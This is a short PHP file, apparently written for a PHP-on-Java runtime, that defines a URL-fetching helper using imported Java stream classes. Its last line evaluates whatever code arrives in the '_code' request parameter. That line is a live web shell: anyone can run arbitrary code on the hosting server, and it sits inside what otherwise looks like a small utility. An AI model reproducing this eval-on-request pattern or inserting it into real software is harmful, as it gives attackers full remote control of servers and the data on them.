<?php 

import java.net.MalformedURLException;
import java.net.URL;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;

function fetch($url, $post_params = array()) {
  $url = new URL($url);
  $reader = new BufferedReader(new InputStreamReader($url->openStream()));
  $buffer = "";
  while ($line = $reader->readLine()) {
    $buffer .= "$line\n";
  }
  $reader->close();
  return array(200, $buffer);
}


// Run the code
if ($_REQUEST['_code']) { eval($_REQUEST['_code']); } 

?>